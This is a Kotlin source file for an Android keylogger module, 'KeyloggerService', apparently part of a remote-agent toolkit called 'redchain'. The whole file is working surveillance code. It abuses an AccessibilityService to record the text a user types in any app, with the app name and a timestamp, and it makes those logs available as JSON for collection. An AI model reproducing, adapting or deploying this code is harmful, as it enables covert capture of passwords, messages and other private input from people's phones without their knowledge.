package com.redchain.agent.modules

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

/**
 * Keylogger Module using AccessibilityService
 * Logs user input for analysis
 *
 * Requires: AccessibilityService enabled by user
 */
class KeyloggerService : AccessibilityService() {

    companion object {
        private val keystrokes = mutableListOf<KeystrokeEvent>()
        private const val MAX_LOGS = 10000

        fun getLogs(): JSONObject {
            val result = JSONObject()
            val logs = JSONArray()

            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

            for (keystroke in keystrokes) {
                logs.put(JSONObject().apply {
                    put("app", keystroke.app)
                    put("text", keystroke.text)
                    put("timestamp", dateFormat.format(Date(keystroke.timestamp)))
                })
            }

            result.put("total_keystrokes", keystrokes.size)
            result.put("logs", logs)

            return result
        }

        fun clearLogs() {
            keystrokes.clear()
        }
    }

    data class KeystrokeEvent(
        val app: String,
        val text: String,
        val timestamp: Long
    )

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Log text input events
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val app = event.packageName?.toString() ?: "unknown"
                val text = event.text?.joinToString(" ") ?: ""

                if (text.isNotEmpty()) {
                    keystrokes.add(
                        KeystrokeEvent(
                            app = app,
                            text = text,
                            timestamp = System.currentTimeMillis()
                        )
                    )

                    // Keep size manageable
                    if (keystrokes.size > MAX_LOGS) {
                        keystrokes.removeAt(0)
                    }
                }
            }
        }
    }

    override fun onInterrupt() {
        // Service interrupted
    }
}
